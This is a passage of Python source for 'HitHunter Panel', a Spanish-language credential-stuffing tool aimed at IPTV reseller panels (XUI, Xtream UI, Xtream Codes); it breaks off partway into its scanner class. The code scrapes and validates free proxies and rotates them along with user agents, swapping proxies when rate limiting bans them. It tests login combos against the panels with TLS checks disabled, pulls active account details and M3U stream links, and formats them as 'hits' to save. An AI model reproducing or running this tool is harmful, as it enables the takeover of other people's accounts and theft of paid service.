"""
Author: ɪꜱʜɪʀᴏ  
Date: 2025-03-29  

Description:  
HitHunter Panel es una herramienta de verificación y extracción de datos para paneles IPTV, 
diseñada para analizar y validar credenciales en múltiples tipos de paneles (XUI, Xtream UI, Xtream Codes). 

Contact:  
Para más información, envíame un mensaje en Telegram: https://t.me/iShir0xD  

License: Apache 2.0  

Changelog:  
- V1: Versión inicial para la verificación de usuarios en el panel de destino.  
- V2: Mejoras en el banner y en la obtención de todos los usuarios del panel.  
- V3: Corrección en la extracción de usuarios cuando el panel no contenía "reseller" o "revendedor" en el contexto de la ruta.  
- V4:  
  - Mejorado el formato del tiempo transcurrido (Elapsed) para mostrar días, horas, minutos y segundos (ej. "1d 2h 30m 45s"), haciéndolo más legible en ejecuciones largas.  
  - Refactorizado el cálculo del tiempo transcurrido en la función `format_elapsed_time` para un código más limpio.  
  - Mejoras en la extracción de usuarios en la tabla, ampliando al máximo la paginación para extraer todos los usuarios.
- V5:  
  - Ampliado el escaneo de paneles Xtream UI.  
  - Añadida extracción de datos adicional desde paneles Xtream UI.  
- V6:  
  - Ampliado el escaneo de paneles Xtream Codes junto con la extracción de las cuentas.  
- V7:  
  - Reorganizada la estructura del código para mejorar la modularidad y facilitar la incorporación de nuevas funciones.
  - Implementación de sistema de manejo de proxies mejorado con validación y guardado automático
  - Optimización del manejo de memoria y recursos en operaciones concurrentes
  - Mejora en la detección y clasificación automática de tipos de paneles
  - Sistema de caché para proxies validados con persistencia en archivo
  - Implementación de timeout dinámico basado en la respuesta del servidor
  - Mejora en el manejo de errores y recuperación automática
  - Soporte mejorado para diferentes tipos de paneles IPTV
  - Sistema de rotación de User-Agents optimizado
- V7.5:   
  - Mejoras a nivel de proxies, aumento en reintentos y manejo de errores.
  - Mejoras visuales a nivel de bot usados,cpm,status code,errores.
  - Validación de tipos de paneles para evitar escaneos no soportados.
  - Implementación de cacheo para categorias obtenidas de paneles Xtream UI y Xtream Codes, con TTL configurable.
"""
import sys
import subprocess
import os


DEPENDENCIES = ['tqdm', 'requests', 'bs4', 'colorama', 'urllib3', 'pysocks']

for package in DEPENDENCIES:
    try:
        __import__('socks' if package == 'pysocks' else package)
    except ImportError:
        print(f"[INFO] Instalando dependencia faltante: {package}")
        if package == 'requests':
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests[socks]"])
        else:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])


import re
import time
import platform
import threading
import random
import requests
import socket
import socks
from tqdm import tqdm
from urllib.parse import urlparse, urljoin
from typing import List, Dict, Any, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from datetime import datetime
from threading import Lock

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:"
    "TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:"
    "TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:"
    "ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:"
    "TLS13-AES-128-GCM-SHA256"
)

init(autoreset=True)

start_time = time.time()
start_time_str = time.strftime("%Y-%m-%d • %H:%M %p", time.localtime(start_time))
completed = 0
hits = 0
hits_m3u = 0
hits_lock = threading.Lock()
hits_m3u_lock = threading.Lock()
stop_event = threading.Event()
print_lock = threading.Lock()

class Config:
    DEBUG_MODE = False    
    COLORS = [
        Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN,
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    URL_PATTERN = re.compile(
        r"^(https?://)?"
        r"[a-zA-Z0-9.-]+"
        r"(:\d{1,5})?"
        r"(/[^\s]*)?$"
    )
    HOST_PORT_PATTERN = r"^(?:https?://)?([\w.-]+):(\d+)(?:/.*)?$"
    system = platform.system()
    if system == "Windows":
        ROOT_DIR = os.path.join(".", "sdcard")
    elif system == "Linux":
        if os.path.exists("/sdcard"):
            ROOT_DIR = "/sdcard"
        else:
            ROOT_DIR = os.path.join(".", "sdcard")
    else:
        ROOT_DIR = os.path.join(".", "sdcard") 
    COMBO_DIR = os.path.join(ROOT_DIR, "combo")
    HITS_DIR = os.path.join(ROOT_DIR, "hits", "𝐇𝐢𝐭𝐇𝐮𝐧𝐭𝐞𝐫_𝐏𝐚𝐧𝐞𝐥")
    PROXIES_DIR = os.path.join(ROOT_DIR, "Proxies")
    
    LOGIN_HEADERS = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "es-US,es-419;q=0.9,es;q=0.8",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "user-agent": None
    }
    
    USERS_AGENTS = [
        # Chrome en Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        # Chrome en Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        # Chrome en Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        # Firefox en Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        # Firefox en Linux
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        # Firefox en Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
        # Safari en Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        # Edge en Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        # Chrome en Android
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        # Safari en iPhone
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
    ]
    
    PANEL_TYPES = {
        'xui': 'xui',
        'xtream_ui': 'xtream_ui',
        'xtream_codes': 'xtream_codes',
        'panel_xc': 'panel_xc',
        'unknown': 'unknown'
    }
    
    PANEL_TYPE_DISPLAY = {
        'xui': f"{Fore.LIGHTGREEN_EX}xᴜɪ ᴏɴᴇ{Fore.RESET}",
        'xtream_ui': f"{Fore.LIGHTYELLOW_EX}xᴛʀᴇᴀᴍ ᴜɪ{Fore.RESET}",
        'xtream_codes': f"{Fore.LIGHTCYAN_EX}xᴛʀᴇᴀᴍ ᴄᴏᴅᴇ𝐬{Fore.RESET}",
        'panel_xc': f"{Fore.LIGHTBLUE_EX}ᴘᴀɴᴇʟ xᴄ{Fore.RESET}",
        'unknown': f"{Fore.RED}Unknown Panel{Fore.RESET}"
    }
    @classmethod
    def get_login_headers(cls):
        headers = cls.LOGIN_HEADERS.copy()
        headers["user-agent"] = random.choice(cls.USERS_AGENTS)
        return headers
                
class ProxyHandler:
    def __init__(self):
        self.proxy_list = []
        self.banned_proxies = set()
        self.current_proxy = None
        self.proxy_type = None
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        self.lock = threading.Lock()
        self.proxy_queue = []
        self.recently_used_proxies = []
        self.max_recently_used = 5
        self.use_proxy = False
        self.temp_banned_proxies = {}

    def is_android_qpython(self):
        try:
            import androidhelper
            return True
        except ImportError:
            return 'ANDROID_ARGUMENT' in os.environ or any("/qpython" in path for path in sys.path)
    def select_proxy_type(self):
        print(f"\n{Fore.LIGHTYELLOW_EX}[*] Selecciona el tipo de proxy:{Style.RESET_ALL}")
        print(f"{Fore.LIGHTRED_EX} 1) HTTP{Style.RESET_ALL}")
        print(f"{Fore.LIGHTRED_EX} 2) SOCKS4{Style.RESET_ALL}")
        print(f"{Fore.LIGHTRED_EX} 3) SOCKS5{Style.RESET_ALL}")
        while True:
            try:
                choice = int(input(f"{Fore.LIGHTRED_EX}➤ {Fore.RESET}{Fore.LIGHTCYAN_EX}"))
                if choice == 1:
                    self.proxy_type = 'http'
                    return
                elif choice == 2:
                    self.proxy_type = 'socks4'
                    return
                elif choice == 3:
                    self.proxy_type = 'socks5'
                    return
                print(f"{Fore.LIGHTRED_EX}Invalido, elige 1-3{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.LIGHTRED_EX}Solo numeros{Style.RESET_ALL}")

    def fetch_proxies(self, proxy_file=None):
        urls = {
            'http': [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite",
                "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
                "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
                "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
                "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt"
            ],
            'socks4': [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=elite",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
                "https://www.proxy-list.download/api/v1/get?type=socks4&anon=elite",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
                "https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/main/socks4.txt",
                "https://cdn.jsdelivr.net/gh/ObcbO/getproxy/file/socks4.txt",
            ],
            'socks5': [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=elite",
                "https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite",
                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
                "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
                "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
                "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            ]
        }

        if not self.proxy_type:
            self.select_proxy_type()

        all_proxies = set()

        def is_valid_proxy(proxy):
            return bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$', proxy))

        if proxy_file:
            try:
                with open(proxy_file, 'r') as file:
                    proxies = [line.strip() for line in file if line.strip() and is_valid_proxy(line.strip())]                    
                    all_proxies.update(proxies)
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}Error al leer el archivo de proxies: {str(e)[:20]}{Style.RESET_ALL}")
                return False
        else:
            for index, url in enumerate(urls[self.proxy_type], start=1):
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code != 200:
                        continue
                    proxies = [line.strip() for line in response.text.splitlines() if line.strip() and is_valid_proxy(line.strip())]
                    print(f"{Fore.LIGHTYELLOW_EX}De Origen [{index}] obtuvimos {len(proxies)} proxies{Style.RESET_ALL}")
                    all_proxies.update(proxies)
                except Exception as e:
                    print(f"{Fore.LIGHTRED_EX}Error en {url.split('/')[2]}: {str(e)[:20]}{Style.RESET_ALL}")

        if not all_proxies:
            print(f"{Fore.LIGHTRED_EX}No se obtuvieron proxies.{Style.RESET_ALL}")
            return False

        print(f"\n{Fore.LIGHTGREEN_EX}Obtenidos {len(all_proxies)} proxies.{Style.RESET_ALL}")
        my_ip = requests.get("https://api.ipify.org?format=json", timeout=5).json()["ip"]
        self.proxy_list = self.validate_proxies(list(all_proxies),my_ip)
        if not self.proxy_list:
            print(f"{Fore.LIGHTRED_EX}\nNo hay proxies vivos{Style.RESET_ALL}")
            return False

        with self.lock:
            self.proxy_queue = self.proxy_list.copy()

        return True

    def validate_proxies(self, proxies, my_ip,verbose=False):
        test_url = "http://ifconfig.me/ip"
        live_proxies = []
        total_proxies = len(proxies)
        self.live_proxies_count = 0
        self.dead_proxies_count = 0
        
        def check_proxy(proxy):
            proxy_url = f"{self.proxy_type}://{proxy}"
            proxies_dict = {"http": proxy_url, "https": proxy_url}
            
            try:
                with requests.Session() as session:
                    session.proxies = proxies_dict
                    response = session.get(test_url, timeout=(5, 10))
                    if response.status_code == 200: 
                        proxy_ip = response.text.strip()
                        if proxy_ip != my_ip:
                            with self.lock:
                                self.live_proxies_count += 1
                                live_proxies.append(proxy)
                            if verbose:
                                print(f"{Fore.LIGHTGREEN_EX}✓ Proxy {proxy} VIVO{Style.RESET_ALL}")
                            return True
            except (requests.exceptions.RequestException, socket.timeout) as e:
                if verbose:
                    error_type = "Timeout" if isinstance(e, (socket.timeout, requests.exceptions.Timeout)) else "Error"
                    print(f"{Fore.LIGHTRED_EX}✗ Proxy {proxy} FALLÓ ({error_type}){Style.RESET_ALL}")
            with self.lock:
                self.dead_proxies_count += 1
            return False

        max_workers = 50 if self.is_android_qpython() else 100
        print(f"\n{Fore.CYAN}Verificando {total_proxies} proxies ({self.proxy_type})\ncon {max_workers} hilos...{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
            for future in tqdm(as_completed(futures), total=total_proxies, unit="proxy", ascii="░█"):
                pass 

        if live_proxies:
            current_date = datetime.now().strftime("%Y%m%d_%H%M")
            filename = f"valid_{self.proxy_type}_{current_date}.txt"
            filepath = os.path.join(Config.PROXIES_DIR, filename)
            
            try:
                os.makedirs(Config.PROXIES_DIR, exist_ok=True)
                with open(filepath, 'w') as f:
                    f.write('\n'.join(live_proxies))
                print(f"\n{Fore.LIGHTGREEN_EX}✓ {len(live_proxies)} proxies guardados en: {filepath}{Style.RESET_ALL}")
            except Exception as e:
                print(f"\n{Fore.LIGHTRED_EX}Error al guardar: {str(e)}{Style.RESET_ALL}")

        print(f"\n{Fore.LIGHTCYAN_EX}Resumen de Verificación:{Style.RESET_ALL}")
        print(f"\n{Fore.LIGHTCYAN_EX}Total={total_proxies} | {Fore.LIGHTGREEN_EX}Vivos={self.live_proxies_count}{Fore.LIGHTCYAN_EX} | {Fore.LIGHTRED_EX}Muertos={self.dead_proxies_count}{Style.RESET_ALL}")
        return live_proxies

    def get_proxy(self):
        with self.lock:
            self._clean_temp_banned()
            if not self.proxy_list:
                self.current_proxy = None
                return None

            if not self.proxy_queue:
                available_proxies = [
                    p for p in self.proxy_list
                    if p not in self.banned_proxies and
                    p not in self.recently_used_proxies and
                    p not in self.temp_banned_proxies
                ]
                if not available_proxies:
                    available_proxies = [
                        p for p in self.proxy_list
                        if p not in self.banned_proxies and
                        p not in self.temp_banned_proxies
                    ]
                    self.recently_used_proxies.clear()
                if not available_proxies:
                    self.current_proxy = None
                    return None

                self.proxy_queue = available_proxies.copy()

            proxy = self.proxy_queue.pop(0)
            self.recently_used_proxies.append(proxy)
            if len(self.recently_used_proxies) > self.max_recently_used:
                self.recently_used_proxies.pop(0)

            self.current_proxy = proxy
            return {"http": f"{self.proxy_type}://{proxy}", "https": f"{self.proxy_type}://{proxy}"}

    def _clean_temp_banned(self):
        to_remove = [p for p, (_, count) in self.temp_banned_proxies.items() if count >= 3]
        for p in to_remove:
            self.ban_proxy(p)
            self.temp_banned_proxies.pop(p, None)

    def ban_proxy(self, proxy, temporary: bool = False):
        if not proxy:
            return
        with self.lock:
            if temporary:
                current_count = self.temp_banned_proxies.get(proxy, (0, 0))[1]
                self.temp_banned_proxies[proxy] = (threading.get_ident(), current_count + 1)
            else:
                if proxy not in self.banned_proxies:
                    self.banned_proxies.add(proxy)
                    self.temp_banned_proxies.pop(proxy, None)
                    if proxy in self.proxy_queue:
                        self.proxy_queue.remove(proxy)

    @property
    def live_count(self):
        with self.lock:
            return len([p for p in self.proxy_list
                       if p not in self.banned_proxies and
                       p not in self.temp_banned_proxies])

    @property
    def banned_count(self):
        return len(self.banned_proxies)
    
class UserInfoExtractor:
        def __init__(self):
            self._channels_cache = {}
            self._cache_lock = threading.Lock()
            self._cache_ttl = 86400  # 24 horas
        def _get_random_headers(self, base_url: str) -> Dict[str, str]:
            return {
                "User-Agent": random.choice(Config.USERS_AGENTS),
                "Referer": base_url,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
        
        def get_host_and_port(self, url: str) -> Tuple[str, str]:
            parsed = urlparse(url)
            host = parsed.hostname or ""
            port = str(parsed.port) if parsed.port else "80"
            return host, port

        def get_user_info(self, username: str, password: str, server_url: str, proxy_used: Any) -> Optional[Dict[str, Any]]:
            url = f"{server_url}/player_api.php?username={username}&password={password}"
            if Config.DEBUG_MODE:
                print(f"{Fore.LIGHTYELLOW_EX}➜ Iniciando solicitud a {url} {'con proxy' if proxy_used else 'sin proxy'}{Style.RESET_ALL}")
            try:
                headers = self._get_random_headers(server_url)
                if proxy_used:
                    response = requests.get(url, headers=headers, proxies=proxy_used, timeout=5)
                else:
                    response = requests.get(url, headers=headers, timeout=5)
                if Config.DEBUG_MODE:
                    print(f"{Fore.LIGHTCYAN_EX}✓ Respuesta recibida: status_code={response.status_code}{Style.RESET_ALL}")
                if response.status_code == 200:
                    user_info = response.json()
                    if user_info and user_info.get('user_info', {}).get('status', '').lower() == 'active':
                        if Config.DEBUG_MODE:
                            print(f"{Fore.LIGHTGREEN_EX}✓ Usuario activo encontrado: {username} en {server_url}{Style.RESET_ALL}")
                        return user_info
                    if Config.DEBUG_MODE:
                        print(f"{Fore.LIGHTRED_EX}✗ No se encontró usuario activo para {username} en {server_url}{Style.RESET_ALL}")
                    return None
                if Config.DEBUG_MODE:
                    print(f"{Fore.LIGHTRED_EX}✗ Respuesta inválida (status {response.status_code}) para {server_url}{Style.RESET_ALL}")
                return None
            except Exception as e:
                if Config.DEBUG_MODE:
                    print(f"{Fore.LIGHTRED_EX}✗ Error en solicitud para {username}:{password} en {server_url}: {str(e)[:50]}{Style.RESET_ALL}")
                return None

        def get_channel_list(self, server_url: str, username: str, password: str, proxy_used: Any) -> Optional[List[Dict[str, Any]]]:
            cache_key = server_url
            with self._cache_lock:
                if cache_key in self._channels_cache:
                    cached_data, timestamp = self._channels_cache[cache_key]
                    if time.time() - timestamp < self._cache_ttl and cached_data is not None:
                        if Config.DEBUG_MODE:
                            print(f"{Fore.LIGHTGREEN_EX}✓ Usando canales cacheados para {server_url}{Style.RESET_ALL}")
                        return cached_data
            url = f"{server_url}/player_api.php?username={username}&password={password}&action=get_live_categories"
            try:
                headers = self._get_random_headers(server_url)
                if proxy_used:
                    response = requests.get(url, headers=headers, proxies=proxy_used, timeout=5)
                else:
                    response = requests.get(url, headers=headers, timeout=5)

                if response.status_code == 200:
                    channels = response.json()
                    with self._cache_lock:
                        self._channels_cache[cache_key] = (channels, time.time())
                        if Config.DEBUG_MODE:
                            print(f"{Fore.LIGHTCYAN_EX}✓ Canales cacheados para {server_url}{Style.RESET_ALL}")
                return channels                
            except Exception as e:
                return None

        def format_channel_list(self, channels: Optional[List[Dict[str, Any]]]) -> str:
            if not channels:
                return "📺 ᴄᴀᴛᴇɢᴏʀɪᴇꜱ : Sin categorías disponibles\n"
                
            try:
                valid_channels = [
                    channel.get('category_name', 'Desconocido') 
                    for channel in channels 
                    if isinstance(channel, dict) and channel.get('category_name')
                ]                
                if not valid_channels:
                    return "📺 ᴄᴀᴛᴇɢᴏʀɪᴇꜱ : Sin categorías válidas\n"                    
                formatted_channels = " ⚡ ".join(valid_channels) + " ⚡"
                return f"📺 ᴄᴀᴛᴇɢᴏʀɪᴇꜱ : {formatted_channels}\n"                
            except Exception as e:
                print(f"Error al formatear lista de canales: {e}")
                return "📺 ᴄᴀᴛᴇɢᴏʀɪᴇꜱ : Error al procesar categorías\n"

        def format_user_info(self, user_data: Dict[str, Any], server_url: str, proxy_used: Any, url:str, username:str, password:str ) -> str:
            user = user_data.get('user_info', {})
            server = user_data.get('server_info', {})
            exp_date = "ᴜɴʟɪᴍɪᴛᴇᴅ"
            if user.get('exp_date'):
                try:
                    exp_date = datetime.fromtimestamp(int(user['exp_date'])).strftime('%d-%m-%Y')
                except (ValueError, TypeError):
                    exp_date = "ᴜɴʟɪᴍɪᴛᴇᴅ"
            channels = self.get_channel_list(server_url, user.get('username', ''), user.get('password', ''), proxy_used)
            channel_list = self.format_channel_list(channels)
            xui_status = "Yᴇꜱ" if server.get('xui', False) else "ɴᴏ"
            return f"""
╭───✦ 彡★ нιт нυηтєя ραηєℓєѕ 彡★
├● 💻 ᴩᴀɴᴇʟ ➨ {url}
├● 👑 ᴜꜱᴇʀ  ➨ {username}
├● 🔐 ᴩᴀꜱꜱ  ➨ {password}
╰───✦
╭───✦ 彡★ нιт нυηтєя 彡★
├● 🎯 ʜɪᴛ ʙy : ιѕнιяσ
├● 🖥️ ꜱᴇʀᴠᴇʀ : {server_url}
├● 🌐 ʀᴇᴀʟ   : {server.get('url','')}:{server.get('port','')}
├● 👑 ᴜꜱᴇʀ   : {user.get('username', '')}
├● 🔐 ᴩᴀꜱꜱ   : {user.get('password', '')}
├● 📶 ꜱᴛᴀᴛᴜꜱ : {user.get('status', '')}
├● ⌛️ ᴇxᴩɪʀᴀᴛɪᴏɴ : {exp_date}
├● 🔌 ᴄᴏɴɴᴇᴄᴛɪᴏɴꜱ : {user.get('active_cons', '')}/{user.get('max_connections', '')}
├● 🕒 ᴛɪᴍᴇᴢᴏɴᴇ : {server.get('timezone', '')}
├● 📡 xᴜɪ : {xui_status}
├● ⚡ ꜱᴄᴀɴᴛʏᴩᴇ : ᴩᴀɴᴇʟ ꜱᴄᴀɴɴᴇʀ
╰───✦ᴠ7.5 | ᴩy ᴄᴏɴꜰɪɢ ʙy ɪꜱʜɪʀᴏ

 🌐 ᴍ3ᴜ : {server_url}/get.php?username={user.get('username', '')}&password={user.get('password', '')}&type=m3u_plus
    \n{channel_list}
    """
    
class RequestHandler:
    def __init__(self, headers: Dict[str, str]):
        self.HEADERS = headers
        self.proxy_error_count = {}

    @staticmethod
    def get_human_readable_error(e: Exception) -> str:
        error_msg = str(e)
        if isinstance(e, requests.exceptions.ConnectTimeout):
            return "ᴛɪᴇᴍᴘᴏ ᴅᴇ ᴄᴏɴᴇxɪóɴ ᴀɢᴏᴛᴀᴅᴏ ⏳"
        elif isinstance(e, requests.exceptions.ReadTimeout):
            return "ᴛɪᴇᴍᴘᴏ ᴅᴇ ʟᴇᴄᴛᴜʀᴀ ᴀɢᴏᴛᴀᴅᴏ ⏲️"
        elif isinstance(e, requests.exceptions.ConnectionError):
            return "ᴇʀʀᴏʀ ᴅᴇ ᴄᴏɴᴇxɪóɴ 🔌"
        elif isinstance(e, requests.exceptions.SSLError):
            return "ᴇʀʀᴏʀ ꜱꜱʟ 🔒"
        elif isinstance(e, requests.exceptions.ProxyError):
            if any(s in error_msg for s in ["SOCKSHTTPSConnectionPool", "SOCKS5ConnectionPool", "SOCKS4ConnectionPool"]):
                return "ᴇʀʀᴏʀ ᴇɴ ᴘʀᴏxy ꜱᴏᴄᴋꜱ 🧦"
            elif "Cannot connect to proxy" in error_msg:
                return "ɴᴏ ꜱᴇ ᴄᴏɴᴇᴄᴛó ᴀʟ ᴘʀᴏxy 🚫"
            elif "Proxy Authentication Required" in error_msg or "SOCKS5 authentication failed" in error_msg:
                return "ᴇʀʀᴏʀ ᴅᴇ ᴀᴜᴛᴇɴᴛɪᴄᴀᴄɪóɴ ᴇɴ ᴘʀᴏxy 🔑"
            elif "Failed to resolve" in error_msg:
                return "ᴇʀʀᴏʀ ᴀʟ ʀᴇꜱᴏʟᴠᴇʀ ᴅɴꜱ ᴇɴ ᴘʀᴏxy 🌐"
            elif "Timeout" in error_msg:
                return "ᴛɪᴇᴍᴘᴏ ᴅᴇ ᴘʀᴏxy ᴀɢᴏᴛᴀᴅᴏ ⏰"
            elif "Tunnel connection failed" in error_msg:
                return "ᴇʀʀᴏʀ ᴇɴ ᴛúɴᴇʟ ᴅᴇʟ ᴘʀᴏxy 🛤️"
            return "ᴇʀʀᴏʀ ᴅᴇ ᴘʀᴏxy 🛑"
        elif isinstance(e, requests.exceptions.HTTPError):
            if getattr(e.response, 'status_code', None) == 429:
                return "ʟíᴍɪᴛᴇ ᴅᴇ ꜱᴏʟɪᴄɪᴛᴜᴅᴇꜱ⁽⁴²⁹⁾ ⚠️"
            return "ᴇʀʀᴏʀ ʜᴛᴛᴘ 🚨"
        elif isinstance(e, requests.exceptions.TooManyRedirects):
            return "ᴍáxɪᴍᴏꜱ ʀᴇᴅɪʀᴇᴄᴄɪᴏɴᴀᴍɪᴇɴᴛᴏꜱ 🔄"
        elif isinstance(e, requests.exceptions.MissingSchema):
            return "ᴜʀʟ ꜱɪɴ ᴇꜱQᴜᴇᴍᴀ 📛"
        elif isinstance(e, requests.exceptions.InvalidURL):
            return "ᴜʀʟ ɪɴᴠáʟɪᴅᴀ 🌐"
        elif isinstance(e, requests.exceptions.InvalidSchema):
            return "ᴇꜱQᴜᴇᴍᴀ ɴᴏ ꜱᴏᴘᴏʀᴛᴀᴅᴏ 🚫"
        elif isinstance(e, requests.exceptions.ChunkedEncodingError):
            return "ᴇʀʀᴏʀ ᴇɴ ᴄᴏᴅɪꜰɪᴄᴀᴄɪóɴ 📉"
        elif isinstance(e, requests.exceptions.ContentDecodingError):
            return "ᴇʀʀᴏʀ ᴀʟ ᴅᴇᴄᴏᴅɪꜰɪᴄᴀʀ 📇"
        elif isinstance(e, requests.exceptions.StreamConsumedError):
            return "ꜰʟᴜᴊᴏ ʏᴀ ᴄᴏɴꜱᴜᴍɪᴅᴏ 🔍"
        elif isinstance(e, requests.exceptions.RetryError):
            return "ᴇʀʀᴏʀ ᴇɴ ʀᴇɪɴᴛᴇɴᴛᴏꜱ 🔁"
        return error_msg.split('\n')[0]

    def _should_ban_proxy(self, proxy_str: str, error_type: str) -> bool:
        if not proxy_str or proxy_str == "None":
            return False
        immediate_ban_errors = {"Error HTTP 429"}
        if error_type in immediate_ban_errors:
            return True
        self.proxy_error_count[proxy_str] = self.proxy_error_count.get(proxy_str, 0) + 1
        return self.proxy_error_count[proxy_str] >= 5

    def make_request(self, session: requests.Session, url: str, body: Dict[str, str],proxy_manager: Optional[ProxyHandler], max_retries: int = 3) -> Tuple[Optional[requests.Response], Optional[Dict], Optional[str], Optional[str]]:
        adapter = HTTPAdapter()
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        last_error = "N/A"
        for attempt in range(max_retries):
            proxy = proxy_manager.get_proxy() if proxy_manager and proxy_manager.live_count > 0 else None
            proxy_str = proxy_manager.current_proxy if proxy_manager and proxy_manager.current_proxy else "None"
            try:
                response = session.post(url,data=body,allow_redirects=False,verify=False,timeout=(5, 10),proxies=proxy)
                if proxy_str != "None":
                    self.proxy_error_count.pop(proxy_str, None)
                if response.status_code == 429:
                    error_msg = f"Error HTTP {response.status_code}"
                    if Config.DEBUG_MODE:
                        print(f"{Fore.YELLOW}⚠️ Ban detectado (429). Cambiando proxy....{Fore.RESET}")
                    if proxy_str != "None" and self._should_ban_proxy(proxy_str, error_msg):
                        proxy_manager.ban_proxy(proxy_str)
                    continue
                return response, proxy, proxy_str, None
            except requests.exceptions.RequestException as e:
                error_msg = self.get_human_readable_error(e)
                last_error = error_msg
                continue
        return None, None, None, last_error

class PanelScanner:
    def __init__(self):
        self.start_time = time.time()
        self.start_time_str = time.strftime("%Y-%m-%d • %H:%M %p", time.localtime(self.start_time))
        self.completed = 0
        self.hits = 0
        self.hits_m3u = 0
        self.hits_lock = threading.Lock()
        self.hits_m3u_lock = threading.Lock()
        self.proxy_manager = None
        self.user_info_extractor = UserInfoExtractor()
        self.terminal_height = os.get_terminal_size().lines

    def clear_console(self) -> None:
        os.system('cls' if os.name == 'nt' else 'clear')

    def format_elapsed_time(self, elapsed_time: float) -> str:
